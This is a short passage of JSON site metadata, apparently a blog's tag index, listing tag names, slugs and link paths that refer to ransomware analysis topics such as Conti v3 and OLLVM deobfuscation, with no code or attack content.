ransomeware","slug":"ollvm-dumpulator-ransomeware","link":"/tags/ollvm-dumpulator-ransomeware/"},{"name":"Ransomeware","slug":"Ransomeware","link":"/tags/Ransomeware/"},{"name":"Ransomeware,Conti v3","slug":"Ransomeware-Conti-v3","link":"/tags/Ransomeware-Conti-v3/"}],"categories":[]}